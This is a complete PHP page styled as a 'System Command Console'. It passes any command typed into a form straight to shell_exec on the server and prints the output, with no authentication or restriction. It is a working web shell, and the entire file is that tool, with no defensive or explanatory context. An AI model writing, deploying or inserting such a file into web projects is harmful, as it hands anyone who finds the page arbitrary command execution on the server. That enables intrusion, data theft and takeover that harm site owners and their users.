<!DOCTYPE html>
<html>
<head>
    <title>PHP Web Console</title>
    <style>
        body { background: #1a1a1a; color: #00ff00; font-family: monospace; padding: 20px; }
        input { background: #333; color: #fff; border: 1px solid #555; width: 80%; padding: 5px; }
        pre { background: #000; padding: 15px; border-radius: 5px; overflow-x: auto; white-space: pre-wrap; }
    </style>
</head>
<body>
    <h3>System Command Console</h3>
    <form method="POST">
        <span>$ </span><input type="text" name="cmd" autofocus>
        <button type="submit">Execute</button>
    </form>
    <hr>
    <?php
    if (isset($_POST['cmd'])) {
        $command = $_POST['cmd'];
        echo "<strong>Command:</strong> " . htmlspecialchars($command) . "<br><pre>";
        
        // Use shell_exec to run the command and capture output
        $output = shell_exec($command . " 2>&1"); // 2>&1 redirects errors to show in output
        
        echo $output ? htmlspecialchars($output) : "Command executed (no output).";
        echo "</pre>";
    }
    ?>
</body>
</html>